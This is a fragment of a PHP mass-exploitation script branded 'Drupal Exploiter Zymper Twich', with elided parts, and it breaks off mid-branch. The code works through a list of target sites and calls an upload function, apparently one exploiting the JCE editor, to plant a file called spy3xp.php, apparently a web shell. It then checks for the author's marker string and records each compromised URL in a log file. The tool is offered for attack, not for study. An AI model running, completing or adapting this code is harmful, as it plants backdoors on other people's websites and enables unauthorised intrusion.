...
<link href="" rel="stylesheet" type="text/css">
	<link rel="shortcut icon" href="https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcQ0osWryENRVYM23qkA8pmJ_IwahZVw0zeeSwrnRkeU12SpWfAY" />

    <title>Drupal Exploiter Zymper Twich</title>
<style type='text/css'>
body{
...
$name = "spy3xp.php";
        ...
        $sites = trim ($sites);
        jce_upload ($sites, "By ZympeR Twich<br><br>".$up, $dir, $name); 
 
        if (preg_match ("/ZympeR Twich/i", @file_get_contents ("$sites/images/stories/$name")))
        {
                echo "success -> $sites/images/stories/$name\n";
                fwrite ($file, "$sites/images/stories/$name\n");
        }
        elseif (preg_match ("/ZympeR Twich/i", @file_get_contents ("$site/images/$name")))
        {
                echo "success -> $site/images/$name\n";
                fwrite ($file, "$sites/images/$name\n");
        }
        elseif (preg_match ("/ZympeR Twich/i", @file_get_contents ("$site/$name")))
        {
